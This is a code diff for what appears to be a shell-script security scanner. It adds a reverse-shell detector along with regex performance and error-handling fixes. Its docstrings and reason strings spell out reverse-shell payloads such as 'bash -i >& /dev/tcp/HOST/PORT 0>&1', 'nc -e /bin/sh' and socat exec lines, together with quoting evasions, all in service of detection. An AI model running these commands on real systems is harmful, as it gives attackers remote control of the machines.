+    A comment starts at an unquoted, unescaped `#` that begins a word (line start, or
+    right after a blank) outside a `${...}` expansion (`${x/ #/}` is a pattern, not a
+    comment), and runs to the end of its PHYSICAL line. `breaks` lists where a
+    backslash-newline join sat in this (already joined) logical line: a comment ends
+    there, because a comment that ends in a backslash does NOT continue onto the next line
+    -- the next physical line is real code. The join point becomes `;` (a segment start), so the code
+    on the far side is not mistaken for an argument of whatever preceded the comment. A `#`
+    glued to a metacharacter (`echo a;#b`) is deliberately not treated as a comment: fewer
+    comments is the conservative direction for THAT case (nothing real is hidden by it).
+    It is NOT true of the quote state: it is tracked by parity, so a command substitution
+    with its own quotes inside a double-quoted string (`"$(echo "a # b")"`) flips it, and a
+    ` #` inside is then read as a comment start that blanks real code to the end of the
+    line. That lexer confusion is a declared ceiling (docs/THREAT_COVERAGE.md), not a
+    conservative direction.
+
+    Blanking the comment before the quote scan matters twice: its text can carry an
+    apostrophe (`# don't`) that would otherwise open a quote across the real code that
+    follows, and its text can carry the payload words (`# ... /dev/tcp/H/P`) that must not
+    count as evidence for a shell that stands before the `#`."""
+    n = len(text)
+    mask = bytearray(n)
+    out = None
+    q = ""
+    depth = 0
+    at_word = True
+    dollar_end = -1
+    i = 0
+    while i < n:
+        c = text[i]
+        if q == "'":
+            if c == "'":
+                q = ""
+                at_word = False
+            else:
+                mask[i] = 1
+            i += 1
+            continue
+        if q == '"' or q == "$'":
+            if c == "\\" and i + 1 < n:
+                mask[i] = 1
+                mask[i + 1] = 1
+                i += 2
+                continue
+            if c == q[-1]:
+                q = ""
+                at_word = False
+            else:
+                mask[i] = 1
+            i += 1
+            continue
+        if c == "\\":
+            at_word = False
+            i += 2
+            continue
+        if c == "'" or c == '"':
+            q = "$'" if (c == "'" and dollar_end == i) else c
+            at_word = False
+        elif c == "$":
+            dollar_end = i + 1
+            at_word = False
+            if text.startswith("{", i + 1):
+                depth += 1
+                i += 1
+        elif c == "}":
+            if depth:
+                depth -= 1
+            at_word = False
+        elif c in " \t":
+            at_word = True
+        elif c == "#" and at_word and not depth and breaks is not None:
+            k = bisect.bisect_left(breaks, i)
+            j = breaks[k] if k < len(breaks) else n
+            if out is None:
+                out = list(text)
+            for p in range(i, j):
+                out[p] = " "
+            if j < n:
+                out[j] = ";"
+            i = j + 1
+            at_word = True
+            continue
+        else:
+            at_word = False
+        i += 1
+    return mask, ("".join(out) if out is not None else text)
+
+
+def _sh_rev_quote_mask(text: str) -> bytearray:
+    """The quote mask of `_sh_rev_lex` alone (comments untouched)."""
+    return _sh_rev_lex(text)[0]
+
+
+def _sh_rev_quoted_name(text: str, mask: bytearray, start: int, end: int) -> bool:
+    """True when `text[start:end]` is the whole content of a quote pair that opens right
+    before it and closes right after it -- `"bash"`, `'nc'`, `"/bin/sh"` -- i.e. a command
+    name merely spelled inside quotes (the same documented alias-bypass spelling that
+    `_sh_nc_word` undoes for `nc`)."""
+    return bool(
+        start
+        and mask[start]
+        and text[start - 1] in "'\""
+        and text[end : end + 1] == text[start - 1]
+        and not mask[start - 1]
+    )
+
+
+def _sh_rev_name_end(text: str, mask: bytearray, start: int, end: int) -> int:
+    """Where the ARGUMENTS of the command word `text[start:end]` begin: one past `end` when
+    a whole-word quote pair closes there (`"bash" -i ...` -- reading the tail from the
+    closing quote itself made that quote the shell's first operand, so the headline
+    payload with a quoted command name read as "a shell running a script" and vetted
+    INSTALL), else `end`."""
+    return end + 1 if _sh_rev_quoted_name(text, mask, start, end) else end
+
+
+# One shell word, the way `_sh_nc_command_position` sees it: a lone `;`/`&`/`|`/`(`/backtick, or a
+# maximal run of anything else that is not whitespace (the same cut as
+# `_SH_NC_METACHAR_RE.sub(" \\1 ", s).split()`, but with positions).
+_SH_REV_TOKEN_RE = re.compile(r"[;&|(`]|[^\s;&|(`]+")
+_SH_REV_BLOCK, _SH_REV_START, _SH_REV_PASS = 0, 1, 2
+
+
+def _sh_rev_word_kind(w: str) -> int:
+    """How one word behaves for a command-position walk that goes BACKWARD over it:
+    `_SH_REV_START` (a segment start: the walk answers yes), `_SH_REV_PASS` (a no-op wrapper,
+    a flag, a `VAR=val` prefix: the walk continues), or `_SH_REV_BLOCK` (any other word: the
+    walk answers no). Exactly the classes `_sh_nc_command_position` applies, after the three
+    rewrites this scan adds on top of it: a `{` and a `case`-arm label (`start)`) are segment
+    starts. `if`/`while`/`until` were rewritten to a segment start when THEY sit in command
+    position and left as a blocking word when not -- which is the same as passing through
+    them, since the walk then reaches the answer the keyword itself would have got."""
+    if w == "{" or (w.endswith(")") and w != "("):
+        return _SH_REV_START
+    if w in _SH_REV_SEG_KEYWORDS:
+        return _SH_REV_PASS
+    low = w.lower()
+    if w in _SH_NC_SEGMENT_START or low in _SH_NC_SEGMENT_START:
+        return _SH_REV_START
+    if low in _SH_NC_NOOP_PREFIX:
+        return _SH_REV_PASS
+    if w.startswith("-") and len(w) > 1:
+        return _SH_REV_PASS
+    if _SH_NC_VAR_ASSIGN_RE.match(w):
+        return _SH_REV_PASS
+    return _SH_REV_BLOCK
+
+
+class _ShRevPos:
+    """Command-position oracle for ONE logical-line text, built in one linear pass.
+
+    `at(start, end)` is True when the word `text[start:end]` is a real, unquoted COMMAND NAME:
+    it does not begin inside a quote, and walking back over no-op wrappers / flags /
+    `VAR=val` prefixes (`_sh_nc_command_position`) reaches a segment start. The look-back is
+    bounded at `_SH_REV_WINDOW` characters; a truncated window is fenced with a blocking
+    sentinel so a token far down a huge line can never be mistaken for the line's first word.
+
+    Two spellings of the same command name are undone first, because both are documented
+    alias-bypass evasions rather than different commands: a single leading backslash
+    (`\\nc`, see `_sh_nc_word`) and a whole-word quote pair (`'nc'`, `"bash"`).
+
+    The first version re-sliced and re-split a 600-character window for EVERY candidate token:
+    cost grew with the NUMBER of tokens (about 200 words each), so a dense `nc nc nc ... -e sh`
+    line a megabyte long cost ~10x a plain scan and exhausted the audit's per-check time
+    budget (C-135 round 3). Now the words, their kinds and "the nearest word that is not
+    a pass-through" are computed once, lazily, and each query is a bisect plus O(1) -- with
+    the same answer, because a backward walk over pass-through words always lands on the
+    nearest non-pass-through word, and the window only decides whether that word is still
+    inside it (`tests/test_shell_scan.py` pins the equivalence differentially)."""
+
+    __slots__ = ("text", "mask", "_built", "_starts", "_ends", "_kinds", "_prev")
+
+    def __init__(self, text: str, mask: bytearray) -> None:
+        self.text = text
+        self.mask = mask
+        self._built = False
+        self._starts: list = []
+        self._ends: list = []
+        self._kinds: list = []
+        self._prev: list = []
+
+    def _build(self) -> None:
+        starts, ends, kinds, prev = [], [], [], []
+        last = -1  # index of the nearest word so far that is not a pass-through
+        for m in _SH_REV_TOKEN_RE.finditer(self.text):
+            starts.append(m.start())
+            ends.append(m.end())
+            kind = _sh_rev_word_kind(m.group())
+            kinds.append(kind)
+            prev.append(last)
+            if kind != _SH_REV_PASS:
+                last = len(kinds) - 1
+        prev.append(last)  # prev[n]: nearest non-pass-through word of the whole text
+        self._starts, self._ends, self._kinds, self._prev = starts, ends, kinds, prev
+        self._built = True
+
+    def at(self, start: int, end: int) -> bool:
+        text, mask = self.text, self.mask
+        lead = start
+        if start and text[start - 1] == "\\" and not mask[start - 1]:
+            lead = start - 1
+        elif _sh_rev_quoted_name(text, mask, start, end):
+            lead = start - 1
+            if lead >= 1 and text[lead] == "'" and text[lead - 1] == "$" and (
+                lead < 2 or text[lead - 2] != "\\"
+            ):
+                lead -= 1  # ANSI-C `$'bash'`: the command word begins at the `$`
+        elif mask[start]:
+            return False
+        if not self._built:
+            self._build()
+        lo = max(0, lead - _SH_REV_WINDOW)
+        # the window's first word is cut (or at least unverifiable) and becomes the sentinel
+        first = bisect.bisect_right(self._ends, lo) if lo else 0
+        idx = bisect.bisect_left(self._starts, lead)  # words that begin before the lead
+        if idx and self._ends[idx - 1] > lead:
+            # the lead falls INSIDE a word (`x"bash"`, `foo\\nc`): the window ends mid-word
+            t = idx - 1
+            if lo and t <= first:
+                return False
+            kind = _sh_rev_word_kind(self.text[self._starts[t] : lead])
+            if kind != _SH_REV_PASS:
+                return kind == _SH_REV_START
+            j = self._prev[t]
+        else:
+            j = self._prev[idx]
+        if j < 0:
+            return not lo  # walked off the front: a line start, unless the window was cut
+        if lo and j <= first:
+            return False  # the nearest real word is the sentinel (or beyond the window)
+        return self._kinds[j] == _SH_REV_START
+
+
+def _sh_rev_shell_tail(text: str, start: int, hi: int) -> tuple:
+    """`(bare, interactive)` for the shell invocation whose arguments are `text[start:hi]`.
+    `bare` = no script/command operand (`-c` counts as one): the shell reads its commands
+    from its stdin. `interactive` = `-i` is among the leading options -- so a `-i` that
+    belongs to a SCRIPT (`bash report.sh -i all`) never counts. Lazy: it stops at the first
+    operand, so it costs a few words per shell token, not the tail."""
+    interactive = False
+    skip = 0
+    budget = _SH_REV_TAIL_WORDS
+    for m in _SH_REV_WORD_RE.finditer(text, start, hi):
+        if skip:
+            skip -= 1
+            continue
+        if not budget:
+            # A run of option/redirect words that long is not a real invocation (a hostile
+            # `>sh >sh >sh ...` glued-redirect chain never reaches an operand, so every one
+            # of its shell tokens would otherwise re-walk the rest of the 4 KB tail: measured
+            # 1.3 s per 4 KB block, quadratic). Answer it the way the uncapped walk answered
+            # an option run it never saw the end of -- NO operand, interactive -- so padding
+            # more options in front of the redirect can never turn a payload into a miss;
+            # the only thing it can convict is text that has a socket redirect in the tail
+            # too.
+            return True, True
+        budget -= 1
+        w = m.group()
+        r = _SH_REV_REDIR_OP_RE.match(w)
+        if r:
+            if r.end() == len(w):  # a bare operator: its target is the next word
+                skip = 1
+            continue
+        if w[0] in "+-":
+            # A redirect can be glued straight onto the option (`-i>&/dev/tcp/H/P`,
+            # `-i>& /dev/tcp/...`): judge the OPTION part only. Judging the whole word
+            # read the `c` of `tcp` as a `-c` cluster and turned the canonical payload
+            # into "a shell with a command operand".
+            cut = _SH_REV_GLUED_REDIR_RE.search(w)
+            opt, glued = (w[: cut.start()], w[cut.start() :]) if cut else (w, "")
+            if _SH_REV_INTERACTIVE_WORD_RE.fullmatch(opt):
+                interactive = True
+            if opt in _SH_REV_OPT_WITH_VALUE:
+                skip = 1
+            if "c" in opt and opt[0] == "-" and opt[1:2] != "-":
+                return False, interactive  # `-c CMD`: the command is the operand
+            if glued:
+                r = _SH_REV_REDIR_OP_RE.match(glued)
+                if r and r.end() == len(glued):  # a bare operator: target is the next word
+                    skip = 1
+            continue
+        return False, interactive
+    return True, interactive
+
+
+def _sh_rev_quoted_body(text: str, quote_at: int) -> str:
+    """The body of the quoted string whose opening quote is `text[quote_at]`, un-escaped
+    for the double-quote case. Unterminated -> the rest of the text."""
+    q = text[quote_at]
+    i = quote_at + 1
+    n = len(text)
+    while i < n:
+        if q == '"' and text[i] == "\\":
+            i += 2
+            continue
+        if text[i] == q:
+            break
+        i += 1
+    body = text[quote_at + 1 : i]
+    if q == '"':
+        body = re.sub(r"\\([\"$`\\])", r"\1", body)
+    return body
+
+
+def _sh_rev_prepare(text: str) -> tuple:
+    """`(quote mask, command-position oracle)` of one layer's text."""
+    mask = _sh_rev_quote_mask(text)
+    return mask, _ShRevPos(text, mask)
+
+
+def _sh_rev_unwrap(text: str, mask: bytearray, pos: "_ShRevPos") -> list:
+    """Bodies of `<shell> [flags] -c '<body>'` and `eval '<body>'` wrappers whose wrapper
+    token is itself a real command-position word. The cheap wrapper-shape test runs first;
+    the (windowed) command-position test only for a token that already looks like one."""
+    bodies = []
+    for m in _SH_REV_SHELL_TOK_RE.finditer(text):
+        w = _SH_REV_C_WRAP_RE.match(text, _sh_rev_name_end(text, mask, m.start(), m.end()))
+        if w and pos.at(m.start(), m.end()):
+            bodies.append(_sh_rev_quoted_body(text, w.end(1) - 1))
+    for m in _SH_REV_EVAL_TOK_RE.finditer(text):
+        w = _SH_REV_EVAL_WRAP_RE.match(text, _sh_rev_name_end(text, mask, m.start(), m.end()))
+        if w and pos.at(m.start(), m.end()):
+            bodies.append(_sh_rev_quoted_body(text, w.end(1) - 1))
+    return bodies
+
+
+def _sh_rev_scan_text(
+    text: str, open_fds: set, mask: "bytearray | None" = None, pos: "_ShRevPos | None" = None
+) -> "str | None":
+    """Shape name (`devtcp` / `nc_exec` / `socat_exec` / `fd_shell`) when this ONE command
+    text carries a reverse-shell primitive, else None. `open_fds` accumulates the fds this
+    file has bound to a socket with `exec N<>/dev/tcp/...` (shape 4).
+
+    Every shape checks its cheap, tail-local evidence FIRST (a bisect into positions found
+    once for the whole text) and the command-position test only for a token that already
+    has it."""
+    if mask is None:
+        mask = _sh_rev_quote_mask(text)
+    if pos is None:
+        pos = _ShRevPos(text, mask)
+    n = len(text)
+    delims = [m.start() for m in _SH_REV_DELIM_RE.finditer(text) if not mask[m.start()]]
+    starts_cache: dict = {}
+
+    def tail_end(pos: int) -> int:
+        i = bisect.bisect_left(delims, pos)
+        return min(delims[i] if i < len(delims) else n, pos + _SH_REV_TAIL_MAX)
+
+    def unquoted(pattern, gate: bool = True) -> list:
+        key = (pattern, gate)
+        got = starts_cache.get(key)
+        if got is None:
+            got = [m.start() for m in pattern.finditer(text) if not (gate and mask[m.start()])]
+            starts_cache[key] = got
+        return got
+
+    def within(starts: list, lo: int, hi: int) -> bool:
+        i = bisect.bisect_left(starts, lo)
+        return i < len(starts) and starts[i] < hi
+
+    for m in _SH_REV_FDCLOSE_RE.finditer(text):
+        if not mask[m.start()]:
+            open_fds.discard(m.group(1))
+    for m in _SH_REV_FDOPEN_RE.finditer(text):
+        if not mask[m.start()]:
+            open_fds.add(m.group(1))
+    dup_open: list = []
+    if open_fds:
+        dup_open = [
+            (m.start(), True)
+            for m in _SH_REV_STDIN_DUP_RE.finditer(text)
+            if not mask[m.start()] and m.group(1) in open_fds
+        ]
+        dup_open += [
+            (m.start(), False)
+            for m in _SH_REV_ANY_DUP_RE.finditer(text)
+            if not mask[m.start()] and m.group(1) in open_fds
+        ]
+    stdin_open = sorted(p for p, is_stdin in dup_open if is_stdin)
+    any_open = sorted(p for p, _ in dup_open)
+    shell_evidence = bool(
+        unquoted(_SH_REV_DEVTCP_REDIR_RE) or unquoted(_SH_REV_DEVTCP_IN_RE) or any_open
+    )
+    for m in _SH_REV_SHELL_TOK_RE.finditer(text) if shell_evidence else ():
+        lo = _sh_rev_name_end(text, mask, m.start(), m.end())
+        hi = tail_end(lo)
+        if lo >= hi:
+            continue
+        sock_in = within(unquoted(_SH_REV_DEVTCP_IN_RE), lo, hi)
+        sock_io = sock_in or within(unquoted(_SH_REV_DEVTCP_REDIR_RE), lo, hi)
+        fd_in = within(stdin_open, lo, hi)
+        fd_io = fd_in or within(any_open, lo, hi)
+        if not (sock_io or fd_io):
+            continue
+        # the O(1) command-position answer first: the tail walk is the costly step, and a
+        # shell that is not a command name (`echo >sh >sh ...`) never needs it
+        if not pos.at(m.start(), m.end()):
+            continue
+        bare, interactive = _sh_rev_shell_tail(text, lo, hi)
+        if not bare:
+            continue
+        shape = None
+        if sock_io and (
+            sock_in
+            or interactive
+            or within(unquoted(_SH_REV_STDIN_DUP_RE), lo, hi)
+        ):
+            shape = "devtcp"
+        elif fd_in or (fd_io and interactive):
+            shape = "fd_shell"
+        if shape:
+            return shape
+    for m in _SH_REV_NC_TOK_RE.finditer(text) if unquoted(_SH_REV_NC_EXEC_RE) else ():
+        hi = tail_end(m.end())
+        if within(unquoted(_SH_REV_NC_EXEC_RE), m.end(), hi) and pos.at(m.start(), m.end()):
+            return "nc_exec"
+    # the address list is DATA to socat, quoted or not: no quote gate on the addresses
+    # themselves (`socat 'EXEC:"bash -li",pty' tcp:H:P`), only on the `socat` word.
+    socat_net = unquoted(_SH_REV_SOCAT_NET_RE, False)
+    socat_exec = unquoted(_SH_REV_SOCAT_EXEC_RE, False)
+    for m in _SH_REV_SOCAT_TOK_RE.finditer(text) if socat_net and socat_exec else ():
+        hi = tail_end(m.end())
+        if (
+            within(socat_net, m.end(), hi)
+            and within(socat_exec, m.end(), hi)
+            and pos.at(m.start(), m.end())
+        ):
+            return "socat_exec"
+    return None
+
+
+_SH_REV_REASONS = {
+    "devtcp": (
+        "binds a shell's stdio to a network socket (bash -i >& /dev/tcp/HOST/PORT 0>&1) "
+        "\u2014 reverse shell"
+    ),
+    "nc_exec": (
+        "runs nc/ncat/netcat with an exec flag that names a shell (nc -e /bin/sh HOST PORT) "
+        "\u2014 reverse/bind shell"
+    ),
+    "socat_exec": (
+        "runs socat with an exec:/system: address that is a shell next to a network address "
+        "(socat exec:'bash -li',pty tcp:HOST:PORT) \u2014 reverse/bind shell"
+    ),
+    "fd_shell": (
+        "opens a network socket as a file descriptor (exec N<>/dev/tcp/HOST/PORT) and binds a "
+        "shell's stdio to it (sh <&N >&N 2>&N) \u2014 reverse shell"
+    ),
+}
+
+
+def _sh_reverse_shell_lines(masked: str) -> list:
+    """`[(physical_line, shape)]` for every logical line of `masked` (whole-line comments
+    already blanked) carrying a reverse-shell primitive -- see the C-630 block above."""
+    joined = _sh_loop_join_continuations(masked)
+    hits = []
+    open_fds: set = set()
+    ln = 1
+    pos = 0
+    for raw in joined.split("\n"):
+        here = ln
+        seg = pos
+        ln += masked.count("\n", pos, pos + len(raw)) + 1
+        pos += len(raw) + 1
+        if not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
+            continue
+        # Comments are code that never runs: blank them (per PHYSICAL line -- see
+        # `_sh_rev_lex`) before anything reads the line, so a trailing `# note` cannot turn
+        # a bare shell into "a shell with an operand", nor a payload quoted in a comment
+        # count as a payload.
+        breaks: list = []
+        if "#" in raw:
+            k = masked.find("\n", seg, seg + len(raw))
+            while k != -1:
+                breaks.append(k - seg)
+                k = masked.find("\n", k + 1, seg + len(raw))
+            raw = _sh_rev_lex(raw, breaks)[1]
+        # Every layer is (text, quote mask, command-position oracle), each built once. A wrapper
+        # BODY is only worth a scan when it can carry a primitive at all -- the same gate the
+        # line itself passed (a cue, or an `&` that could be a dup of an fd this line opens):
+        # a megabyte of `sh -c 'x'` decoys otherwise paid a full scan per empty body. The gate
+        # is exact, not a heuristic: nothing in `_sh_rev_scan_text` can answer for a text
+        # without a cue unless it dups an fd (`&`), and an unwrapped body only ever loses
+        # backslashes, so it cannot GAIN a cue its parent lacked.
+        may_open = bool(open_fds) or "/dev/" in raw
+        layers = [(raw, *_sh_rev_prepare(raw))]
+        texts = list(layers)
+        for _ in range(2):  # `bash -c "bash -c '...'"`: two wrapper levels, no more
+            nxt = []
+            for t, mask, oracle in layers:
+                for body in _sh_rev_unwrap(t, mask, oracle):
+                    if _SH_REV_CUE_RE.search(body) or (may_open and "&" in body):
+                        b = _sh_rev_lex(body, [])[1]
+                        nxt.append((b, *_sh_rev_prepare(b)))
+            if not nxt:
+                break
+            layers = nxt
+            texts.extend(layers)
+        shape = None
+        for t, mask, oracle in texts:
+            shape = _sh_rev_scan_text(t, open_fds, mask, oracle)
+            if shape:
+                break
+        if shape:
+            hits.append((here, shape))
+    return hits
+
+
 # B-341: the original false-condemnation repro attributed to THIS check (SkillTrustBench
 # unifi-api.sh, case_01666/case_04964) was `jq -nc --arg password "$PASS"
 # '{...,password:$password}'` matching SHELL_ENV_EXFIL - but the actual trigger turned
@@ -15776,12 +16823,49 @@ _SH_DOWNLOAD_TO_PATH_RE = re.compile(
 _SH_LINE_URL_RE = re.compile(r"https?://[^\s\"'<>|)]{4,512}")
 # The URL may sit on the same line or come from a variable assigned earlier, so the
 # download line itself is not required to carry an http literal - see _sh_staged_exec.
+#
+# C-730: linear time. The statement start used to be followed by `\s*`, which also runs
+# across newlines, so in a run of blank lines EVERY newline began an attempt that scanned
+# the rest of the run (and `then\s+\s*` could split a blank run in n ways). The blanks
+# after the start now stay on one line (`[^\S\n]*`): a command after blank lines is reached
+# from the LAST newline before it instead of the first. The same commands are found with
+# the same `path` group; only where the match begins moves, and `_sh_run_stmt_start` gives
+# the caller the position the old pattern began at, so the reported line is unchanged.
 _SH_RUN_PATH_RE = re.compile(
-    r"(?:^|[\n;&|]|\b(?:then|do|else)\s+)\s*(?:sudo\s+)?"
-    r"(?:source|\.|bash|sh|zsh|python3?|node|perl|ruby)\s+"
+    r"(?:^|[\n;&|]|\b(?:then|do|else)(?=\s))[^\S\n]*"
+    r"(?P<cmd>(?:sudo\s+)?(?:source|\.|bash|sh|zsh|python3?|node|perl|ruby))\s+"
     r"(?P<path>[\"']?[\w./$~{}-]{2,128}[\"']?)",
     re.I,
 )
+_SH_RUN_KEYWORDS = ("then", "else", "do")
+
+
+def _sh_run_stmt_start(text: str, m: "re.Match", floor: int = 0) -> int:
+    """Where the pre-C-730 `_SH_RUN_PATH_RE` began the match *m* now begins later.
+
+    The old pattern began at the LEFTMOST point from which whitespace alone led to the
+    command: the `;`, `&` or `|` before the blank run, else the `then`/`do`/`else` before it,
+    else the start of the text when the run begins there, else the run's first newline.
+    *floor* is where the previous match ended: a keyword that was itself the previous
+    match's path (`bash then` followed by another command) was already consumed and could
+    not start the next one.
+    """
+    q = m.start("cmd")
+    w = q
+    while w > 0 and text[w - 1].isspace():
+        w -= 1
+    if w == 0:
+        return 0
+    if text[w - 1] in ";&|":
+        return w - 1
+    if q > w:
+        for kw in _SH_RUN_KEYWORDS:
+            k = w - len(kw)
+            if k >= floor and text[k:w].lower() == kw and (
+                    k == 0 or not (text[k - 1].isalnum() or text[k - 1] == "_")):
+                return k
+    nl = text.find("\n", w, q)
+    return nl if nl >= 0 else m.start()
 _SH_HTTP_RE = re.compile(r"https?://", re.I)
 
 
@@ -15816,10 +16900,13 @@ def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
     if not staged:
         return []
     found: list[tuple[int, str]] = []
+    prev_end = 0
     for m in _SH_RUN_PATH_RE.finditer(masked):
         p = _sh_norm_path(m.group("path"))
         if p in staged:
-            found.append((masked.count("\n", 0, m.start()) + 1, p))
+            found.append(
+                (masked.count("\n", 0, _sh_run_stmt_start(masked, m, prev_end)) + 1, p))
+        prev_end = m.end()
     return found
 
 
@@ -16782,7 +17869,9 @@ _SH_BRANCH_KW_RE = re.compile(
 # (`Pattern.match(string, pos)` anchors there directly; no `\A`/`^` token needed, and
 # neither would work correctly here since `\A` anchors to offset 0 of the STRING, not
 # to `pos`).
-_SH_CASE_WILDCARD_ARM_RE = re.compile(r"[ \t\n]*\(?[ \t\n]*\*[ \t\n]*\)")
+# C-730: `(?:\([ \t\n]*)?` instead of `\(?[ \t\n]*` after the first blank run: the same
+# language, but two adjacent blank runs no longer split n blanks in n ways.
+_SH_CASE_WILDCARD_ARM_RE = re.compile(r"[ \t\n]*(?:\([ \t\n]*)?\*[ \t\n]*\)")
 # The literal `in` closing a case's own `case WORD in` header. Searched for ONLY
 # right after a recognized `case` keyword (never scanned for globally -- a bare
 # `\bin\b` search over the whole file would collide with a `for NAME in` loop
@@ -17303,6 +18392,18 @@ def _sh_mask_comments(source: str) -> str:
     return "\n".join("" if ln.lstrip().startswith("#") else ln for ln in source.splitlines())
 
 
+def _sh_newline_offsets(text: str) -> list[int]:
+    """Offsets of every "\\n" in *text*, ascending. `bisect.bisect_left(offsets, x)` is
+    exactly `text.count("\\n", 0, x)` for any x >= 0 (C-651), without the O(x) rescan from
+    the start of the file that made a script of N lines cost O(N^2)."""
+    offs: list[int] = []
+    i = text.find("\n")
+    while i != -1:
+        offs.append(i)
+        i = text.find("\n", i + 1)
+    return offs
+
+
 def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     """Conservative regex pass over a bundled .sh/.bash/.zsh file (F-050). No shell AST;
     stdlib regex only; never raises, never executes. Flags high-confidence shapes:
@@ -17317,6 +18418,9 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
         (eval "$(curl ... http...)" / source <(wget ... http...)): remote code execution.
       SHELL_ENV_EXFIL (crit) - a credential-shaped env var ($...TOKEN/$...SECRET/...) is sent
         over a RAW socket (nc//dev/tcp): credential exfiltration.
+      SHELL_REVERSE_SHELL (crit) - a shell's stdio is bound to a network socket, in the
+        clear (C-630): `bash -i >& /dev/tcp/H/P 0>&1`, `nc -e /bin/sh H P`,
+        `socat exec:'bash -li' tcp:H:P`, `exec 3<>/dev/tcp/H/P; sh <&3 >&3`.
 
     Whole-line comments are ignored so documentation examples stay clean. The naive
     forms - any $VAR piped to curl (authed-API scripts), or any bare $() command
@@ -17386,6 +18490,10 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "(nc//dev/tcp) \u2014 credential exfiltration",
             )
 
+    # C-630: plaintext reverse shell (bash /dev/tcp, nc -e, socat exec:, fd-bound shell).
+    for _rs_ln, _rs_shape in _sh_reverse_shell_lines(masked):
+        add("SHELL_REVERSE_SHELL", "crit", _rs_ln, _SH_REV_REASONS[_rs_shape])
+
     # B-935: `cred_var_lines` is the POSITIONAL replacement for the old flat,
     # file-global `cred_vars` NAME set - see `_sh_cred_assign_taint_lines`'s own
     # docstring above for why a name-membership check over-and-under-convicted (a
@@ -17449,9 +18557,10 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     loop_direct_lines, loop_hop_lines, header_blanked = _sh_loop_cred_exfil_lines(source, masked)
     joined = _sh_loop_join_continuations(header_blanked)
     pos = 0
+    masked_nl = _sh_newline_offsets(masked)
     for raw in joined.split("\n"):
-        i = masked.count("\n", 0, pos) + 1
-        line_end = masked.count("\n", 0, pos + len(raw)) + 1
+        i = bisect.bisect_left(masked_nl, pos) + 1
+        line_end = bisect.bisect_left(masked_nl, pos + len(raw)) + 1
         pos += len(raw) + 1
         # B-430: same OR pattern as above - see _sh_bare_nc_invocation's docstring.
         if not (_SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw)):
@@ -17552,9 +18661,18 @@ _JS_CP_NAMESPACE_BIND_RE = re.compile(
 )
 # Destructures exec-family names directly out of child_process: `const { exec, spawn } =
 # require('child_process')`, `import { exec, spawn as sp } from 'node:child_process'`.
+#
+# C-730: the two name lists were `[^}]+?`, so on a run of "{" every brace began an attempt
+# that scanned to the next "}" (quadratic). They are `[^{}]+?` now: an attempt stops at the
+# next brace of either kind. Where the two readings differ, the old one had started at an
+# EARLIER "{" and swallowed text up to the list into the first name - a destructure inside
+# a function body, `function go() { const { exec } = require(...) }`, read as the name
+# "const { exec", and a default-value pattern, `{ a: { b } = require('child_process') }`,
+# as "a: { b". The innermost list is matched now, so the real name (`exec`, `b`) is
+# recorded; a list that holds no "{" reads as it always did.
 _JS_CP_DESTRUCTURE_BIND_RE = re.compile(
-    r"\{\s*([^}]+?)\s*\}\s*=\s*require\(\s*['\"](?:node:)?child_process['\"]\s*\)"
-    r"|\bimport\s*\{\s*([^}]+?)\s*\}\s*from\s+['\"](?:node:)?child_process['\"]",
+    r"\{\s*([^{}]+?)\s*\}\s*=\s*require\(\s*['\"](?:node:)?child_process['\"]\s*\)"
+    r"|\bimport\s*\{\s*([^{}]+?)\s*\}\s*from\s+['\"](?:node:)?child_process['\"]",
 )
 
 
@@ -17588,7 +18706,8 @@ def _js_child_process_bindings(masked: str) -> "tuple[set, set]":
             entry = entry.strip()
             if not entry:
                 continue
-            local = re.split(r":\s*|\s+as\s+", entry)[-1].strip()
+            # C-730: `(?<!\s)` - only the first blank of a run may start the ` as ` arm.
+            local = re.split(r":\s*|(?<!\s)\s+as\s+", entry)[-1].strip()
             if local:
                 names.add(local)
     return receivers, names
@@ -17820,11 +18939,12 @@ class ScriptProseCoverageIncomplete(Exception):
     anything was skipped (Golden Rule #4: report UNKNOWN, never a confident-looking
     empty result, when state can't be determined).
 
-    Raising instead of returning `[]` lets this reach `checks/__init__.py::run_all`'s
-    existing per-check crash isolation (B-101, `_check_error_finding`), which already
-    degrades a raising check to one honest UNKNOWN finding rather than sinking the
-    audit or silently reporting nothing found -- reusing that already-audited
-    degradation path rather than inventing a second, parallel one."""
+    Raising instead of returning `[]` keeps "could not read" distinguishable from
+    "nothing there". C-619: the caller is `checks/_content.py::_script_prose_scan`,
+    which catches this per file, records the file as unread and lets the calling check
+    (B66/B156) keep its other evidence and report UNKNOWN plus a `coverage:` note when
+    nothing else was found -- so one unparseable script no longer discards the whole
+    check's result through `run_all`'s crash isolation."""
 
 
 def _py_docstring_text(source: str) -> list[str]:
@@ -17840,7 +18960,7 @@ def _py_docstring_text(source: str) -> list[str]:
     succeeded and there were no docstrings to find."""
     try:
         tree = ast.parse(source)
-    except (SyntaxError, ValueError, RecursionError) as exc:
+    except (SyntaxError, ValueError, RecursionError, MemoryError, OverflowError) as exc:
         raise ScriptProseCoverageIncomplete(
             f"could not parse Python source for docstring extraction "
             f"({type(exc).__name__}) -- prose coverage is incomplete, not empty"
@@ -17969,9 +19089,10 @@ def extract_script_prose(source: str, ext: str) -> list[str]:
     Raises `ScriptProseCoverageIncomplete` for `ext == "py"` when `ast.parse` cannot
     parse `source` at all (B-377) -- deliberately NOT folded into the `[]` case, which
     would make "no docstrings" and "could not determine" indistinguishable; see that
-    exception's docstring. The "sh"/"js" paths never raise -- their extraction is
-    lexical (line/comment scanning), not a full parse, so there is no analogous
-    failure mode.
+    exception's docstring (C-619: `checks/_content.py::_script_prose_scan` catches it
+    per file and records the file as unread). The "sh"/"js" paths never raise -- their
+    extraction is lexical (line/comment scanning), not a full parse, so there is no
+    analogous failure mode.
     """
     if ext == "py":
         return _py_docstring_text(source)
